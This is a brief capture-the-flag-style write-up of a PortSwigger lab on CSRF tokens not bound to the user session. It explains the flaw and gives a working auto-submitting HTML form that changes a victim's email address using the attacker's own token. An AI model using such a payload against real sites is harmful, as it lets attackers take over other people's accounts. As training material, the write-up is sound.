# [Lab: CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)

## Lab

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

## Analysis

the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

it's mean that i can use my token to generate csrf poc.

## Solutions

my account's csrf token:

```html
<html>
  <body>
    <form action="https://id.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked@gmail.com" />
      <input type="hidden" name="csrf" value="h5WnPpnDNs3XnrBEp0oCpB8KEQ1mjY7t" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
